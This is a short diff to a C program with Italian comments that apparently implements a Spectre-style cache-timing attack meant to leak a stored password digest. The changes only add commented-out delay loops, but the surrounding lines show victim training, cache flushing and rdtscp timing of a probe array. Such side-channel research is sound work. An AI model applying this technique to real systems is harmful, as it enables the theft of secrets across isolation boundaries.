@@ -103,6 +103,9 @@ int main(int argn, char *argv[]) {
 					victim_function(1, passwordDigest[1]);
 				}
 
+				/*for (volatile int z = 0; z < 100; z++) {
+				}*/
+
 				// flushing array1 e passwordDigest dalla cache
 				for (int i = 0; i < SIZE; i++) {
 					_mm_clflush(&array2[i]);
@@ -115,10 +118,16 @@ int main(int argn, char *argv[]) {
 				// richiamo la funzione vittima con l'ID da attaccare
 				victim_function(userUnderAttack, 1);
 
+				/*for (volatile int z = 0; z < 100; z++) {
+				}*/
+
 				// calcolo il tempo di accesso alla posizione l
 				time1 = __rdtscp(&timeReg);
 				timeReg = array2[l * delta];
 				time2 = __rdtscp(&timeReg) - time1;
+
+				/*for (volatile int z = 0; z < 100; z++) {
+				}*/
 
 				// aggiorno la posizione corrispondente di results
 				// se il tempo < della soglia
